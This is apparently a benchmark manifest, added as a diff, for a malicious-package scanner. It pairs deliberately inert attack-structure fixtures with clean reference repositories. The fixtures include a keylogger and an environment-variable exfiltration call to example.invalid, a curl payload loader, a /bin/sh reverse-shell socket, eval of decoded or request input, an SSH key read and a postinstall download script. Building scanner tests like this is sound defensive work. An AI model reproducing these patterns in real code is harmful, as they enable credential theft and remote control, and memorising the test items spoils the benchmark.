@@ -1,0 +1,482 @@
+{
+  "benchmarkVersion": "0.1.0",
+  "sources": [
+    {
+      "name": "OpenSSF Malicious Packages",
+      "url": "https://github.com/ossf/malicious-packages",
+      "usage": "Independent labels and package/version metadata; withdrawn reports must be excluded."
+    },
+    {
+      "name": "Datadog malicious software packages dataset",
+      "url": "https://github.com/DataDog/malicious-software-packages-dataset",
+      "usage": "Human-triaged private static-sample evaluation only; archives must never be executed."
+    },
+    {
+      "name": "GitHub Amalfi artifact",
+      "url": "https://github.com/githubnext/amalfi-artifact",
+      "usage": "Methodology comparison and externally labeled experiment data."
+    }
+  ],
+  "samples": [
+    {
+      "sampleId": "critical-keylogger-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed behavior: keyboard capture plus network sink",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["EXFIL_KEYLOGGER"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { document.addEventListener('keydown', event => { fetch('https://example.invalid/collect', { method: 'POST', body: event.key }) }) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-beavertail-loader-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Lazarus BeaverTail loader structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["BEAVERTAIL_LOADER_V1"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { require('child_process').exec('curl https://example.invalid/payload') }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-env-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed environment-variable exfiltration structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["BEAVERTAIL_EXFIL"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { const body = JSON.stringify(process.env); fetch('https://example.invalid/collect', { method: 'POST', body }) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-reverse-shell-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed reverse-shell socket structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["REVERSE_SHELL"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(net) { const socket = net.Socket(); const shell = require('child_process').spawn('/bin/sh'); socket.pipe(shell.stdin); shell.stdout.pipe(socket); return socket }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-crypto-miner-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed cryptocurrency-miner endpoint structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["CRYPTO_MINER"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export const inertPoolReference = 'stratum+tcp://example.invalid:3333'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-obfuscated-eval-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Base64-decoded dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["OBFUSCATED_EVAL"],
+      "minimumExpectedVerdict": "medium",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(encoded) { if (false) eval(atob(encoded)) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-rce-endpoint-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed request-driven remote-code-execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["BACKDOOR_RCE_ENDPOINT"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(req) { if (false) eval(req.body.command) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-credential-file-read-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed credential-file access structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["FILE_ACCESS_CREDENTIALS"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(fs) { if (false) fs.readFileSync('/home/example/.ssh/id_rsa') }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-aws-key-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed AWS access-key pattern using a reserved dummy value",
+      "sourceUrl": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["HARDCODED_AWS_KEY"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export const inertDummyAwsKey = 'AKIA1234567890ABCDEF'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-install-script-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed install-time download and dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": ["POSTINSTALL_SCRIPT"],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"inert-install-fixture\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"curl https://example.invalid/payload && node -e \\\"eval('')\\\"\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-keyboard-shortcut-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for ordinary keyboard UI handling",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/ui.js": "document.addEventListener('keydown', event => { if (event.key === 'Escape') closeModal() })\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-placeholder-secret-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for documented placeholder configuration",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "app.py": "app.secret_key = 'your-secret-key-change-in-production'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-flask-debug-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control: deployment warning must not be labeled a backdoor",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "app.py": "app.run(debug=True, host='0.0.0.0', port=5000)\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-detector-regex-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for security tools containing inert detector regexes",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/rules.js": "export const keyloggerPattern = /addEventListener\\(['\\\"']keydown/gi\nexport const minerPattern = /stratum\\+tcp:\\/\\//gi\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-event-stream-safe-version-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Version-bound negative control for the compromised event-stream 3.3.6 incident",
+      "sourceUrl": "https://github.com/dominictarr/event-stream",
+      "immutableRef": "package:event-stream@4.0.1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"reference-consumer\",\"version\":\"1.0.0\",\"dependencies\":{\"event-stream\":\"4.0.1\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-express",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/expressjs/express",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "expressjs/express", "ref": null }
+    },
+    {
+      "sampleId": "reference-fastify",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/fastify/fastify",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "fastify/fastify", "ref": null }
+    },
+    {
+      "sampleId": "reference-koa",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/koajs/koa",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "koajs/koa", "ref": null }
+    },
+    {
+      "sampleId": "reference-axios",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/axios/axios",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "axios/axios", "ref": null }
+    },
+    {
+      "sampleId": "reference-lodash",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/lodash/lodash",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "lodash/lodash", "ref": null }
+    },
+    {
+      "sampleId": "reference-chalk",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/chalk/chalk",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "chalk/chalk", "ref": null }
+    },
+    {
+      "sampleId": "reference-uuid",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/uuidjs/uuid",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "uuidjs/uuid", "ref": null }
+    },
+    {
+      "sampleId": "reference-node-fetch",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/node-fetch/node-fetch",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "node-fetch/node-fetch", "ref": null }
+    },
+    {
+      "sampleId": "reference-react",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/facebook/react",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "facebook/react", "ref": null }
+    },
+    {
+      "sampleId": "reference-vue",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vuejs/core",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "vuejs/core", "ref": null }
+    },
+    {
+      "sampleId": "reference-svelte",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/sveltejs/svelte",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "sveltejs/svelte", "ref": null }
+    },
+    {
+      "sampleId": "reference-vite",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vitejs/vite",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "vitejs/vite", "ref": null }
+    },
+    {
+      "sampleId": "reference-next",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vercel/next.js",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "vercel/next.js", "ref": null }
+    },
+    {
+      "sampleId": "reference-nest",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/nestjs/nest",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "nestjs/nest", "ref": null }
+    },
+    {
+      "sampleId": "noisy-vscode",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/vscode",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "microsoft/vscode", "ref": null }
+    },
+    {
+      "sampleId": "noisy-playwright",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/playwright",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "microsoft/playwright", "ref": null }
+    },
+    {
+      "sampleId": "noisy-cypress",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/cypress-io/cypress",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "cypress-io/cypress", "ref": null }
+    },
+    {
+      "sampleId": "noisy-electron",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/electron/electron",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "electron/electron", "ref": null }
+    },
+    {
+      "sampleId": "noisy-esbuild",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/evanw/esbuild",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "evanw/esbuild", "ref": null }
+    },
+    {
+      "sampleId": "noisy-node",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/nodejs/node",
+      "immutableRef": null,
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": { "kind": "github", "repo": "nodejs/node", "ref": null }
+    }
+  ]
+}
